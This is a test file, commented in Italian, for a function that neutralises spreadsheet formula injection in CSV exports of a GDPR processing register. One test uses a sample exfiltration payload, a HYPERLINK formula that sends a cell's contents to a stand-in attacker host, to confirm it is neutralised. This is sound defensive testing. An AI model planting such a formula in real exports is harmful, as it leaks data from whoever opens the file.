import { describe, expect, it } from "vitest";
import { cella } from "@/app/(app)/azienda/[id]/registro/[tipo]/esporta/route";

// L'ESPORTAZIONE CSV VA AL GARANTE, e si apre in Excel.
//
// Il quoting del CSV rende il file valido; non impedisce al foglio di calcolo di ESEGUIRE
// una cella. Il titolo di una voce di registro arriva dall'utente senza filtro sul primo
// carattere, quindi queste prove valgono per una superficie che esce dall'organizzazione:
// l'art. 30.3 chiede il registro «in forma scritta, anche in formato elettronico», e quel
// file viaggia verso un'autorità.

describe("la cella CSV neutralizza le formule", () => {
  it("prefissa i sei caratteri che avviano una formula", () => {
    // L'apostrofo va PRIMA del carattere d'avvio. Per TAB e CR la cella finisce anche fra
    // virgolette, perché contiene caratteri che il CSV deve proteggere: l'apostrofo si trova
    // allora subito dentro. Le due difese convivono, e la prova verifica entrambe.
    for (const avvio of ["=", "+", "-", "@", "\t", "\r"]) {
      const uscita = cella(`${avvio}HYPERLINK("http://x")`);
      const nudo = uscita.startsWith('"') ? uscita.slice(1) : uscita;
      expect(nudo.startsWith(`'${avvio}`)).toBe(true);
    }
  });

  it("l'attacco reale non parte, e il titolo resta leggibile", () => {
    const uscita = cella('=HYPERLINK("http://attaccante/?x="&A1;"Apri")');
    const nudo = uscita.startsWith('"') ? uscita.slice(1) : uscita;
    expect(nudo.startsWith("'=")).toBe(true);
    // Si neutralizza, non si censura: chi legge il registro deve vedere cosa c'era scritto.
    expect(uscita).toContain("HYPERLINK");
  });

  it("non tocca un titolo normale", () => {
    expect(cella("Violazione del 12 marzo")).toBe("Violazione del 12 marzo");
    expect(cella("Nomina responsabile del trattamento")).toBe("Nomina responsabile del trattamento");
  });

  it("un numero negativo viene prefissato, ed è il prezzo giusto", () => {
    // `-3` comincia con un carattere d'avvio. Meglio un apostrofo davanti a un numero che
    // una formula eseguita sul computer di chi apre il file.
    expect(cella("-3")).toBe("'-3");
  });

  it("continua a produrre CSV valido", () => {
    expect(cella('Verbale "OdV" n. 3')).toBe('"Verbale ""OdV"" n. 3"');
    // Il punto e virgola È il separatore, quindi una cella che lo contiene DEVE essere
    // quotata: senza, la riga acquisterebbe una colonna e le successive slitterebbero.
    expect(cella("Riga uno;Riga due")).toBe('"Riga uno;Riga due"');
    expect(cella("con\ninterruzione")).toBe('"con\ninterruzione"');
  });

  it("i valori non testuali si comportano come prima", () => {
    expect(cella(null)).toBe("");
    expect(cella(undefined)).toBe("");
    expect(cella(true)).toBe("sì");
    expect(cella(false)).toBe("no");
  });
});
